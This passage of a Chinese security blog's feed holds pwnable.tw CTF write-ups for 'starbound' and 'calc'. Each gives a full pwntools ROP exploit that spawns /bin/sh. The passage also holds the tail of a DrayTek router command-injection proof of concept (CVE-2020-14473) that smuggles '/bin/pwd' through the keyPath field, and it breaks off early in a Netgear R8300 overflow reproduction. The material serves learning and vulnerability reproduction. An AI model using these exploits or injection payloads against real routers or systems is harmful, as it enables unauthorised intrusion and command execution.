b64encode</span><br><span class="line">import requests</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">headers = requests.utils.default_headers()</span><br><span class="line">headers[&quot;User-Agent&quot;] = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span><br><span class="line">data = &quot;action=login&amp;keyPath=%27%0A%2fbin%2f&quot; + &quot;pwd&quot;+ &quot;%0A%27&amp;loginUser=a&amp;loginPwd=a&quot;</span><br><span class="line">url = &#123;</span><br><span class="line">    &quot;root&quot;: &quot;http://192.168.1.1&quot;,</span><br><span class="line">    &quot;cgi&quot;: &#123;</span><br><span class="line">        &quot;root&quot;: &quot;/cgi-bin&quot;,</span><br><span class="line">        &quot;uri&quot;: &#123;</span><br><span class="line">            &quot;mf&quot;: &quot;/mainfunction.cgi&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def build_url(p1, p2=None):</span><br><span class="line">    if p2:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1][&quot;root&quot;] + url[p1][&quot;uri&quot;][p2]</span><br><span class="line">    else:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1]</span><br><span class="line"></span><br><span class="line"># requests.adapters.DEFAULT_RETRIES = 5</span><br><span class="line"># session = requests.session()</span><br><span class="line"># session.keep_alive = False</span><br><span class="line">res = requests.post(build_url(&quot;cgi&quot;, &quot;mf&quot;), data=data, headers=headers, verify=False)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/8515loginpy.png" alt></p><blockquote><p>漏洞详情：<a href="https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md" target="_blank" rel="noopener">https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md</a></p><p>参考：<a href="https://bestwing.me/drayteck-vigor-vulnerability-disclosure.html" target="_blank" rel="noopener">https://bestwing.me/drayteck-vigor-vulnerability-disclosure.html</a></p><p><a href="https://www.freebuf.com/vuls/262765.html" target="_blank" rel="noopener">draytek漏洞分析 全家桶</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2020-14472-CVE-2020-14473&quot;&gt;&lt;a href=&quot;#CVE-2020-14472-CVE-2020-14473&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-14472/CVE-2020-14473&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="漏洞复现" scheme="p1Kk.github.io/categories/漏洞复现/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="栈溢出" scheme="p1Kk.github.io/tags/栈溢出/"/>
    
    <category term="路由器" scheme="p1Kk.github.io/tags/路由器/"/>
    
    <category term="cve" scheme="p1Kk.github.io/tags/cve/"/>
    
    <category term="命令注入" scheme="p1Kk.github.io/tags/命令注入/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw starbound wp</title>
    <link href="p1Kk.github.io/2021/02/08/tw/tw%20starbound/"/>
    <id>p1Kk.github.io/2021/02/08/tw/tw%20starbound/</id>
    <published>2021-02-07T16:00:00.000Z</published>
    <updated>2021-03-11T09:02:01.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>程序运行显示找不到 libcrypto1.0.0，运行下列即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libssl1.0.0:i386</span><br></pre></td></tr></table></figure><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p>程序流程多，但是漏洞很明显，数组下标可以越界执行</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/starbug.png" alt></p><blockquote><p>strtol函数会将参数nptr字符串根据参数base来转换成长整型数，参数base范围从2至36。</p><p>long int strtol(const char <em>nptr,char *</em>endptr,int base);</p><ul><li>如果字符串中的整数值超出long int的表示范围（<strong>上溢或下溢</strong>），则strtol返回它所能表示的最大（或最小）整数，并设置errno为ERANGE，例如strtol(“0XDEADbeef~~”, NULL, 16)返回0x7fffffff并设置errno为ERANGE</li></ul></blockquote><p>刚好，在setting中设置name，可以设置下标-33指向name，执行我们在name中写入的东东。同时，虽然他会过滤我们输入的数字之后的内容，但是这后面的内容还是会被写入内存，可以用作后续的gadget。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.bss:080580D0 bss_name        db    ? ;               ; DATA XREF: do_afk+3↑o</span><br><span class="line">.bss:080580D0                                         ; init+1A8↑o ...</span><br><span class="line">......</span><br><span class="line">.bss:0805814F                 db    ? ;</span><br><span class="line">.bss:08058150 dword_8058150   dd ?                    ; DATA XREF: cmd_view+4F↑r</span><br><span class="line">.bss:08058150                                         ; init_map+A8↑w ...</span><br><span class="line">.bss:08058154 ; int bss_choice[]</span><br><span class="line">.bss:08058154 bss_choice      dd ?                    ; DATA XREF: show_main_menu:loc_8048DEF↑w</span><br><span class="line">.bss:08058154                                         ; show_multiplayer_menu:loc_8048EBE↑w ...</span><br><span class="line">.bss:08058158 dword_8058158   dd ?                    ; DATA XREF: show_main_menu+9D↑w</span><br><span class="line">.bss:08058158                                         ; show_multiplayer_menu+85↑w ...</span><br><span class="line">.bss:0805815C dword_805815C   dd ?                    ; DATA XREF: show_main_menu+A7↑w</span><br><span class="line">.bss:0805815C                                         ; show_multiplayer_menu+8F↑w ...</span><br><span class="line">.bss:08058160 dword_8058160   dd ?                    ; DATA XREF: show_main_menu+B1↑w</span><br><span class="line">.bss:08058160                                         ; show_multiplayer_menu+99↑w ...</span><br><span class="line">.bss:08058164 dword_8058164   dd ?                    ; DATA XREF: show_main_menu+BB↑w</span><br><span class="line">.bss:08058164                                         ; show_multiplayer_menu+A3↑w ...</span><br><span class="line">.bss:08058168 dword_8058168   dd ?                    ; DATA XREF: show_main_menu+C5↑w</span><br><span class="line">.bss:08058168                                         ; show_multiplayer_menu+AD↑w</span><br><span class="line">.bss:0805816C dword_805816C   dd ?                    ; DATA XREF: show_main_menu+CF↑w</span><br><span class="line">.bss:08058170 dword_8058170   dd ?                    ; DATA XREF: show_main_menu+D9↑w</span><br></pre></td></tr></table></figure><p>题目没有给libc，还需要布置栈，泄露出函数地址，然后DynELF或者libc_database或者LibcSearcher找libc</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./starbound&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10202</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">main = 0x804A61B</span><br><span class="line">bss = 0x8058100</span><br><span class="line">add_esp = 0x08048e48# add esp, 0x1c ; ret</span><br><span class="line">pop_ebp = 0x080491bc</span><br><span class="line">p3_ret = 0x080494da# # pop ebx, pop esi, pop edi, ret</span><br><span class="line">leave_ret = 0x08048c58</span><br><span class="line">puts_plt = elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">io.sendlineafter(&quot;&gt; &quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def set_name(name):</span><br><span class="line">menu(6)# setting</span><br><span class="line">menu(2)# name </span><br><span class="line">io.sendline(name)</span><br><span class="line">menu(1)# back</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">def leak(addr):</span><br><span class="line">    payload  = &quot;&quot;</span><br><span class="line">    payload += p32(write_plt)</span><br><span class="line">    payload += p32(0x080494da)# pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">    payload += p32(1)</span><br><span class="line">    payload += p32(addr)</span><br><span class="line">    payload += p32(4)</span><br><span class="line">    io.sendafter(&quot;name: &quot;, payload)</span><br><span class="line">    menu(-33)</span><br><span class="line">    data = io.recv()</span><br><span class="line">    return data</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = 0</span><br><span class="line"></span><br><span class="line">set_name(p32(add_esp))</span><br><span class="line">menu(&quot;-33&quot;+&quot;aaaaa&quot;+p32(main))</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload  = &quot;8aaaaaaa&quot;</span><br><span class="line">payload += p32(puts_plt) + p32(pop_ebp) + p32(puts_got)</span><br><span class="line">payload += p32(read_plt) + p32(p3_ret) + p32(0) + p32(bss) + p32(4*6+1)</span><br><span class="line">payload += p32(pop_ebp) + p32(bss-4) + p32(leave_ret)</span><br><span class="line">menu(payload)</span><br><span class="line">libc_puts = u32(io.recv(4))</span><br><span class="line">success(&quot;libc_puts = &quot;+hex(libc_puts))</span><br><span class="line"></span><br><span class="line"># libc6-i386_2.21-0ubuntu4_amd64 / libc6_2.23-0ubuntu11.2_i386</span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;, libc_puts)</span><br><span class="line">libc_base = libc_puts - libc.dump(&quot;puts&quot;)</span><br><span class="line">sys_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">libc_base = libc_puts - libc.sym[&apos;puts&apos;]</span><br><span class="line">sys_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line">success(&quot;sys_addr = &quot;+hex(sys_addr))</span><br><span class="line"></span><br><span class="line">payload  = p32(sys_addr) + p32(0xdeadbeef) + p32(bss+4*4) + &quot;4aaa&quot; + &quot;/bin/sh\x00&quot;</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 0)</span><br></pre></td></tr></table></figure><p>这脚本不开debug还跑不成了…这是什么道理啊❓</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h1&gt;&lt;h2 id=&quot;checksec&quot;&gt;&lt;a href=&quot;#checksec&quot; class=&quot;headerlink&quot; title=&quot;checksec&quot;</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw calc wp</title>
    <link href="p1Kk.github.io/2021/02/07/tw/tw%20calc/"/>
    <id>p1Kk.github.io/2021/02/07/tw/tw%20calc/</id>
    <published>2021-02-06T16:00:00.000Z</published>
    <updated>2021-02-08T03:54:35.563Z</updated>
    
    <content type="html"><![CDATA[<p>这个题目对我来说还是蛮有价值的…</p><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>且为<strong>静态编译</strong></p><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/calc.png" alt="calc"><br><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/get_expr.png" alt="get_expr"><br><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/parse_expt.png" alt="parse_expt"></p><p>整个流程也就是：</p><ol><li>对输入进行过滤，最终得到的字符串存入input中</li><li>将input进行解析<ul><li>先查找运算符</li><li>将遇到的数字保存到pool中，pool[0]为当前遍历到的数字数量，通过pool[0]来索引存放位置</li><li>判断存入operator中的运算符优先级，在eval()中进行运算操作</li></ul></li><li>利用运算符和pool中最后两个数字进行运算，将结果保存在pool[-2]，同时–pool[0]</li></ol><h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><p>综上，如果第一个字符就是运算符，如<code>+10</code></p><p>①第一次运算 ，此时 pool[0] = 1, pool[1] = 10，按照上面的逻辑，就会运算 1+10 = 11，并将结果11存放在pool[0]中，pool[0]再自减，就是pool[0]=10。输出给用户的就是pool[10]。</p><p>如果输入的是<code>+10+1</code></p><p>先同上①，再②第二次运算，此时 pool[0] = 11, 【根据pool[0]得到下一位为】pool[11] = 1，运算结果存放在pool[10] = pool[11] + pool[10] = pool[10] + 1</p><p>说明可以得到可控 n 的pool[n]——可以泄露出pool[n]，也可以篡改pool[n]处的值。</p><p>但是还需要注意一点</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/init_pool.png" alt></p><p>返回地址距离*pool为(0x5A0+4)/4 = 0x169 = 361</p><p>由于是静态编译，我们考虑在ret后构造ROP：int 80h调用execve(“/bin/sh”)，所以我们需要构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">eax = 11</span><br><span class="line">ebx = addr(&quot;/bin/sh&quot;)</span><br><span class="line">ecx = 0</span><br><span class="line">edx = 0</span><br><span class="line">即：</span><br><span class="line">+-----------------------------+</span><br><span class="line">|     addr(pop eax; ret)      | --ret--&gt; pool[361]</span><br><span class="line">+-----------------------------+</span><br><span class="line">|              11             | -------&gt; pool[362]</span><br><span class="line">+-----------------------------+</span><br><span class="line">|      addr(pop edx; ret)     |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|              0              |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| addr(pop ecx; pop ebx; ret) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|              0              |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|       addr(&quot;/bin/sh&quot;)       |——————+</span><br><span class="line">+-----------------------------+      |  </span><br><span class="line">|        addr(int 80h)        |      |    </span><br><span class="line">+-----------------------------+      |</span><br><span class="line">|            &quot;/bin&quot;           |&lt;—————+  pool[369]</span><br><span class="line">+-----------------------------+     </span><br><span class="line">|          &quot;/sh\x00&quot;          |       </span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p>查找可用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./calc --only  &quot;pop|ret&quot;</span><br><span class="line">0x0805c34b : pop eax ; ret</span><br><span class="line">0x080701aa : pop edx ; ret</span><br><span class="line">0x080701d1 : pop ecx ; pop ebx ; ret</span><br><span class="line">$ ROPgadget --binary ./calc --only  &quot;int&quot;</span><br><span class="line">0x08049a21 : int 0x80</span><br></pre></td></tr></table></figure><p>得到我们写入栈中的/bin/sh地址还需要知道当前栈基址，pool[361]为ret，pool[360]为old ebp即main的ebp，就可以得到main的基址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08049452                 push    ebp</span><br><span class="line">.text:08049453                 mov     ebp, esp</span><br><span class="line">.text:08049455                 and     esp, 0FFFFFFF0h🔺</span><br><span class="line">.text:08049458                 sub     esp, 10h</span><br></pre></td></tr></table></figure><p><code>oldEbp&amp;0FFFFFFF0h-0x10</code>就是ret地址。</p><p>还需要注意一点，我们输入+360后，返回的地址为负数，所以我们计算的时候先转换成正数，再转换回来。</p><hr><p>还有一种快捷解法就是利用ropchain，直接布置到栈上就可以</p><h1 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"># Padding goes here</span><br><span class="line">p = &apos;&apos;</span><br><span class="line"></span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;/bin&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec064) # @ .data + 4</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;//sh&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080481d1) # pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701d1) # pop ecx ; pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # padding without overwrite ebx</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x08049a21) # int 0x80</span><br><span class="line"></span><br><span class="line">binary = &quot;./calc&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10100</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = 0</span><br><span class="line">io.recv()</span><br><span class="line">for i in range(len(p)/4):</span><br><span class="line">io.sendline(&apos;+&apos; + str(361+i))</span><br><span class="line">recv = int(io.recv())</span><br><span class="line">print &quot;+&quot;+str(361+i)+&quot; = &quot;+hex(recv)</span><br><span class="line">content = u32(p[i*4:i*4+4])</span><br><span class="line">print&quot;content = &quot;+hex(content)</span><br><span class="line">if content &lt; recv:</span><br><span class="line">recv = recv - content</span><br><span class="line">io.sendline(&apos;+&apos; + str(361+i) + &apos;-&apos; + str(recv))</span><br><span class="line">else:</span><br><span class="line">recv = content-recv</span><br><span class="line">io.sendline(&apos;+&apos; + str(361+i) + &apos;+&apos; + str(recv))    </span><br><span class="line">print &quot;final = &quot;+hex(int(io.recv()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 0)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个题目对我来说还是蛮有价值的…&lt;/p&gt;
&lt;h1 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h1&gt;&lt;h2 id=&quot;checksec&quot;&gt;&lt;a href=&quot;#checksec&quot; cla</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>Netgear R8300 PSV-2020-0211栈溢出复现</title>
    <link href="p1Kk.github.io/2020/12/20/iot/Netgear%20R8300/"/>
    <id>p1Kk.github.io/2020/12/20/iot/Netgear%20R8300/</id>
    <published>2020-12-19T16:00:00.000Z</published>
    <updated>2021-04-14T12:53:59.244Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>复现一个Netgear R8300设备的栈溢出漏洞，要求是编写先探测目标版本号，再发送payload的POC</p></blockquote><h1 id="ARM前言"><a href="#ARM前言" class="headerlink" title="ARM前言"></a>ARM前言</h1><h2 id="arm32指令"><a href="#arm32指令" class="headerlink" title="arm32指令"></a>arm32指令</h2><table><thead><tr><th><strong>指令</strong></th><th><strong>描述</strong></th><th><strong>指令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>MOV</td><td>移动数据</td><td>EOR</td><td>按位异或</td></tr><tr><td>MVN</td><td>移动并取反</td><td>LDR</td><td>加载</td></tr><tr><td>ADD</td><td>加</td><td>STR</td><td>存储</td></tr><tr><td>SUB</td><td>减</td><td>LDM</td><td>加载多个</td></tr><tr><td>MUL</td><td>乘</td><td>STM</td><td>存储多个</td></tr><tr><td>LSL</td><td>逻辑左移</td><td>PUSH</td><td>入栈</td></tr><tr><td>LSR</td><td>逻辑右移</td><td>POP</td><td>出栈</td></tr><tr><td>ASR</td><td>算术右移</td><td>B</td><td>跳转</td></tr><tr><td>ROR</td><td>右旋</td><td>BL</td><td>Link跳转</td></tr><tr><td>CMP</td><td>比较</td><td>BX</td><td>分支跳转</td></tr><tr><td>AND</td><td>按位与</td><td>BLX</td><td>使用Link分支跳转</td></tr><tr><td>ORR</td><td>按位或</td><td>SWI/SVC</td><td>系统调用</td></tr></tbody></table><table><thead><tr><th align="center">ARM架构 寄存器名</th><th align="center">寄存器描述</th><th align="center">Intel架构 